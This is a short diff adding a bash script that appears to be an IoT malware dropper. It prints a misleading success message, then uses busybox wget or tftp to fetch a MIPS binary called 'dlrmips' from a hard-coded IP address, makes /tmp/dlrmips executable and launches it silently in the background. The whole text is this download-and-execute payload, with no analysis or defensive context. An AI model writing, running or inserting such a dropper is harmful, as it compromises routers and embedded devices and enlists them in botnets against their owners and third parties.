@@ -1,0 +1,5 @@
+#!/bin/bash
+echo "mips binary executed successfully"
+/bin/busybox wget -O - http://63.250.59.28:80/dlrmips || /bin/busybox tftp -g -r dlrmips 63.250.59.28 || echo "Download failed"
+chmod +x /tmp/dlrmips 2>/dev/null
+/tmp/dlrmips 2>/dev/null &
